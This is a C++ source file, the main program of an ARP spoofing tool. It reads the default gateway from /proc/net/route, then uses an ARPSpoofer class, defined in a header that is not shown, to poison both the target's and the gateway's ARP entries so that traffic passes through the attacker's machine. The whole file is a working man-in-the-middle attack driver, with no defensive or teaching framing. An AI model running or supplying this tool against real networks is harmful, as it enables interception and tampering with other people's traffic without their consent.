#include<iostream>
#include<pcap/pcap.h>
#include<cstring>
#include"arpspoofer.h"
using namespace std;



int main(int argc,char* argv[])
{
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    FILE *f;
    char line[100],*p,*c,*g,*save;
    struct in_addr gatewayip;
    char gateway[20];

    if(argc != 2)
    {
        cout << "[-] Usage " << argv[0] << "[Target IP]" << endl;
        return 0;
    }

    if((dev = pcap_lookupdev(errbuf)) == NULL)
    {
        cout << "[!] pcap_lookupdev " << errbuf << endl;
        return 1;
    }

    f = fopen("/proc/net/route","r");
    while(fgets(line,100,f))
    {
        p = strtok_r(line," \t",&save);
        c = strtok_r(NULL," \t",&save);
        g = strtok_r(NULL," \t",&save);
        if(p!= NULL && c!=NULL)
        {
            if(!strcmp(c, "00000000"))
            {
                if(g)
                {
                    char *end;
                    int ng = strtol(g,&end,16);
                    gatewayip.s_addr=ng;
                }
                break;
            }
        }
    }
    inet_ntop(AF_INET,&gatewayip.s_addr,gateway,sizeof(gateway));
    ARPSpoofer arpc(dev,argv[1],gateway);
    ARPSpoofer arpd(dev,gateway,argv[1]);
    cout << "[*] start arp spoofing" << endl;
    arpc.startarpspoofing();
    arpd.startarpspoofing();
    cout << "Press Anykey to stop";
    cin.get();
    arpc.stoparpspoofing();
    arpd.stoparpspoofing();
    return 0;

}
